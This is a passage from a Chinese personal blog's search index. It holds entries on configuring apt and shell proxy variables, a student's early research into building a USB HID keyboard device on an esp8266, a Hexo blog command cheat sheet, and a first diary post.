class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">APT configuration file method<br><br>This method uses the apt.conf file which is found in your /etc/apt/ directory. This method is useful if you only want apt-get (and not other applications) to use a http-proxy permanently.<br><br>On some installations there will be no apt-conf file set up. Edit apt-conf file (or create a new one if you have no one yet) using the editor of your choice.<br><br>&gt; sudo nano /etc/apt/apt.conf<br><br>Add this line to your /etc/apt/apt.conf file (substitute your details for yourproxyaddress and proxyport).<br><br>&gt; Acquire::http::Proxy &quot;http://yourproxyaddress:proxyport&quot;;<br><br>Save the apt.conf file.<br></code></pre></td></tr></table></figure><h1 id="全局代理（貌似不管用）"><a href="#全局代理（貌似不管用）" class="headerlink" title="全局代理（貌似不管用）"></a>全局代理（貌似不管用）</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> http_proxy=http://127.0.0.1:7890<br><span class="hljs-built_in">export</span> https_proxy=http://127.0.0.1:7890<br><span class="hljs-built_in">export</span> all_proxy=socks5://127.0.0.1:7891<br><span class="hljs-built_in">export</span> no_proxy=<span class="hljs-string">&quot;127.0.0.1,localhost,*.local.com&quot;</span><br><br><span class="hljs-built_in">export</span> http_proxy=http://[::]:7890<br><span class="hljs-built_in">export</span> https_proxy=http://[::]:7890<br><span class="hljs-built_in">export</span> all_proxy=socks5://[::]:7891<br><span class="hljs-built_in">export</span> no_proxy=<span class="hljs-string">&quot;127.0.0.1,localhost&quot;</span><br><br><span class="hljs-built_in">export</span> no_proxy=<span class="hljs-string">&quot;localhost,127.0.0.0/8,*.local&quot;</span><br><span class="hljs-built_in">export</span> NO_PROXY=<span class="hljs-string">&quot;localhost,127.0.0.0/8,*.local&quot;</span><br><span class="hljs-built_in">export</span> all_proxy=socks://127.0.0.1:7891/<br><span class="hljs-built_in">export</span> ALL_PROXY=socks://127.0.0.1:7891/<br><span class="hljs-built_in">export</span> http_proxy=http://127.0.0.1:7890/<br><span class="hljs-built_in">export</span> HTTP_PROXY=http://127.0.0.1:7890/<br><span class="hljs-built_in">export</span> ftp_proxy=http://127.0.0.1:7890/<br><span class="hljs-built_in">export</span> FTP_PROXY=http://127.0.0.1:7890/<br><span class="hljs-built_in">export</span> https_proxy=http://127.0.0.1:7890/<br><span class="hljs-built_in">export</span> HTTPS_PROXY=http://127.0.0.1:7890/<br><br>env | grep proxy<br><br><span class="hljs-built_in">unset</span> no_proxy<br><span class="hljs-built_in">unset</span> NO_PROXY<br><span class="hljs-built_in">unset</span> all_proxy<br><span class="hljs-built_in">unset</span> ALL_PROXY<br><span class="hljs-built_in">unset</span> http_proxy<br><span class="hljs-built_in">unset</span> HTTP_PROXY<br><span class="hljs-built_in">unset</span> ftp_proxy<br><span class="hljs-built_in">unset</span> FTP_PROXY<br><span class="hljs-built_in">unset</span> https_proxy<br><span class="hljs-built_in">unset</span> HTTPS_PROXY<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初次挖掘HID和硬件工程</title>
    <link href="/hid/HID_firstDig/"/>
    <url>/hid/HID_firstDig/</url>
    
    <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>谷歌了一通，之前虽然也谷歌过但是从来没找到切入点，今天找到外国论坛上别人问过的帖子，跟着跟着就来到了Digispark开发板的页面，之前就知道Arduino的Leonardo开发板支持keyboard库，也知道Digispark开发板比较便宜，但是不知道究竟怎么实现的，虽然好像可以翻库的源码，但是因为手里有esp8266，所以不想再买别的功能重复的开发板。而且当时并没有找到esp8266单板实现HID功能的，就看能不能自己实现。今天找到了<a href="https://space.bilibili.com/213123506">这个UP主</a>的<a href="https://www.bilibili.com/video/BV19U4y1j7PF">视频</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="过程：先以usb、嵌入式、实现 作为关键词搜索库文件，找到arduino的库，找到了这个up主的github开源项目，找到视频。说起来巧，这个up主页还有一个通过抓包蓝牙自制喵喵机的项目之前我就觉得很NB">[1]</span></a></sup>。<br/><br>再看到评论区有人提到别的芯片ch9329(up使用ch9328)，上<a href="https://www.semiee.com/">半导小芯</a>没看懂有什么区别。看来<u>芯片选型</u>也是下一步需要认真考虑的事情。<br/><br>知乎搜了一下芯片选型，他们说硬件工程师靠经验，推荐华为的硬件工程师手册。找到百度文库有但是要vip。想起来图书馆途径的百度文库可以下vip资源<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="共159页，我下下来还没细看，这个非高校版的[链接](https://wenku.baidu.com/view/eb27a1660875f46527d3240c844769eae109a36c.html)供参考">[2]</span></a></sup>，然后真可以。我爱图书馆❤<br/><br><del><font color="gray">写博客真费时间，好多时间都忍不住扯点闲话，扯闲话和刚才经历以上内容一样有趣，但是写博客最多只能起到换换脑子的作用，好像没有价值啊。还有，我感觉打字好慢，这个假期要不要学下双拼🤔</font></del></p><h4 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h4><blockquote><p>上大学之前对游戏看门狗很感兴趣，由此产生对Kali Linux的浓厚“兴趣”（引号是因为到现在为止我还是不会使用它之中的工具），然后因为高中生没什么可支配的钱，为了省钱而跟着视频尝试搭建VPS，由此学了一丁点Linux的使用，也就是apt换个源这样的简单操作，还是为了Kali，感觉拥有一部“黑客手机”很帅，于是尝试编译内核，得知了AOSP，接触了LineageOS。但是，但是到现在我依然不知道怎么编译一个Linux系统，怎么才能过编译（人生中唯二两次过编译，一次是一点没改的LineageOS代码，一次是在VPS上一点没改的玩客云代码，还因为网络问题没有下载下来，跟着实例一起销毁了）。编译内核就是为了NetHunter的特色功能，我唯一认识的就是HID Duck，有两种实现途径——手机、开发板。<br/><br>手机直到这学期在闲鱼上收了一部Nexus5才尝到原生的爽，而开发板总让我意难平——手机内核模块可能存在难度，我先不去啃，但是上学期学过单片机，为什么我不能实现这么基础的功能呢？而且大一暑假末打算DIY游戏外设，由此在大二第一学期开始时打算看USB-HID。现在在学校回不去家就随便看看吧。</p></blockquote><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>过程：先以usb、嵌入式、实现 作为关键词搜索库文件，找到arduino的库，找到了这个up主的github开源项目，找到视频。说起来巧，这个up主页还有一个通过抓包蓝牙自制喵喵机的项目之前我就觉得很NB<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>共159页，我下下来还没细看，这个非高校版的<a href="https://wenku.baidu.com/view/eb27a1660875f46527d3240c844769eae109a36c.html">链接</a>供参考<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂谈</tag>
      
      <tag>HID</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客建立教程及命令备忘</title>
    <link href="/blog/blog_tutorial/"/>
    <url>/blog/blog_tutorial/</url>
    
    <content type="html"><![CDATA[<h3 id="Front-matter设置-amp-默认值"><a href="#Front-matter设置-amp-默认值" class="headerlink" title="Front-matter设置 &amp; 默认值"></a>Front-matter设置 &amp; 默认值</h3><table><thead><tr><th>设置</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>layout</code></td><td>布局</td><td><a href="https://hexo.io/docs/configuration#Writing"><code>config.default_layout</code></a></td></tr><tr><td><code>title</code></td><td>标题</td><td>文章的文件名</td></tr><tr><td><code>date</code></td><td>建立日期</td><td>文件建立日期</td></tr><tr><td><code>updated</code></td><td>更新日期</td><td>文件更新日期</td></tr><tr><td><code>comments</code></td><td>开启文章的评论功能</td><td><code>true</code></td></tr><tr><td><code>tags</code></td><td>标签（不适用于分页）</td><td></td></tr><tr><td><code>categories</code></td><td>分类（不适用于分页）</td><td></td></tr><tr><td><code>permalink</code></td><td>覆盖文章的永久链接. 永久链接应该以 <code>/</code> 或 <code>.html</code> 结尾</td><td><code>null</code></td></tr><tr><td><code>excerpt</code></td><td>纯文本的页面摘要。 使用 <a href="https://hexo.io/zh-cn/docs/tag-plugins#%E6%96%87%E7%AB%A0%E6%91%98%E8%A6%81%E5%92%8C%E6%88%AA%E6%96%AD">该插件</a> 来格式化文本</td><td></td></tr><tr><td><code>disableNunjucks</code></td><td>启用时禁用 Nunjucks 标签 <code>&#123;&#123; &#125;&#125;</code>/<code>&#123;% %&#125;</code> 和 <a href="https://hexo.io/zh-cn/docs/tag-plugins">标签插件</a> 的渲染功能</td><td>false</td></tr><tr><td><code>lang</code></td><td>设置语言以覆盖 <a href="https://hexo.io/zh-cn/docs/internationalization#%E8%B7%AF%E5%BE%84">自动检测</a></td><td>继承自 <code>_config.yml</code></td></tr><tr><td><code>published</code></td><td>文章是否发布</td><td>对于 <code>_posts</code> 下的文章为 <code>true</code>，对于 <code>_draft</code> 下的文章为 <code>false</code></td></tr></tbody></table><p><font color="gray" size="2"><del>前天起计划搭建个人博客，花了一点时间就大概搞出来了，现在分享下我的流程，帮大家快速建立个人博客，以下操作需要电脑。</del></font><br/><br><del>摆烂了，根据第一个参考链接从概述开始就可以了，官方文档下面还有上传github的办法</del><br/><br/><strong>用power shell执行hexo指令时需要打全成hexo.cmd（tab键也可以补全）</strong><br/><br/></p><h1 id="其他玩法"><a href="#其他玩法" class="headerlink" title="其他玩法"></a>其他玩法</h1><a href="/blog/music-embed/" title="内嵌网易云音乐外链，并且根据屏幕宽度选择是否隐藏">内嵌网易云音乐外链，并且根据屏幕宽度选择是否隐藏</a><a href="/blog/bili-embed/" title="内嵌B站播放器">内嵌B站播放器</a><p><a href="https://zahui.fan/posts/ldle4xfe/">使用Obsidian配合Hexo写博客 | 杂烩饭</a><br>使用 <a href="https://github.com/Cyrusky/hexo-backlink|">hexo-backlink</a> 插件实现 hexo 对 obsidian wiki 链接的自动转换</p><h1 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h1><ul><li>生成博客：hexo g</li><li>预览博客：hexo s <font color="gray">浏览器打开命令输入后出来的网址</font></li><li>上传博客：hexo d <font color="gray">github page在上传成功后需要过一会才会变化，只要最近commit的id对的上就证明没错</font></li><li>hexo d -m “评论示例” <font color="gray">上传并附上commit评论</font></li><li>hexo clean <font color="gray">不知道有什么用</font><br><br/><br/></li></ul><p>如果hexo d 出错先检查下网络，然后看看根目录（不是themes下主题的）_config.yml的 “deploy:” 那里有没有打上git仓库信息。<br/><br/><br>分支也不要搞错，例如自己项目里分支是 main 的话不要按照教程打成 master 不知道这会不会有问题。<br/><br/></p><p>参考链接：<br/><br>1.<a href="https://hexo.io/zh-cn/docs">Hexo官方文档</a><br/><br>2.<a href="https://zhuanlan.zhihu.com/p/74778630">不需懂代码，10分钟在Github搭建免费且已成型的个人博客网站 - 知乎</a><br/><br>3.<a href="https://zhuanlan.zhihu.com/p/111832962">在Github/Gitee上搭建免费个人博客网站（进阶篇） - 知乎</a><br/></p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>这是博客的第一篇文章</title>
    <link href="/diary/firstBlogByme/"/>
    <url>/diary/firstBlogByme/</url>
    
    <content type="html"><![CDATA[<h1 id="这是博客的第一篇文章"><a href="#这是博客的第一篇文章" class="headerlink" title="这是博客的第一篇文章"></a>这是博客的第一篇文章</h1><hr><ul><li><p>昨天本该完成早上的马原考试，下午完成重修考试。今天本该完成物理考试。在8号之前我正在为这些考试而头疼，而现在需要考虑怎样对待头一个学生时代不在家的假期。疫情在20年1月开始到现在22年1月，两年时间过后首次给我带来了切身的影响。</p></li><li><p>昨天我还在考虑在假期入门CTF、ACM之类的，结果经过了昨天一晚上尝试搭建php网站打开书本附带的题目未果，今天又花了一天还是连靶场都没有搭建出来，还真不知道还有什么东西好玩了。</p></li><li><p>Blender是挺好玩的，但是没有考试的压力，摸鱼也变得没有那么有吸引力了，学习的趣味性真是相对的啊😔。</p></li><li><p>之前一直没有上传之前提过的ahk脚本的原因是空间不能放二维码，不过如果能看到我的博客的话，我先把链接放到这里</p><blockquote><p><a href="https://gitee.com/zhaosn123/auto-hot-key-my-noob-script">https://gitee.com/zhaosn123/auto-hot-key-my-noob-script</a></p></blockquote></li></ul><hr><p>最后，非常期待能够见到其他人的博客，这个假期我原本打算做些有意义的事情，但是现在又感觉动力不足了，希望能通过我的分享和您的分享让我们共同进步。</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
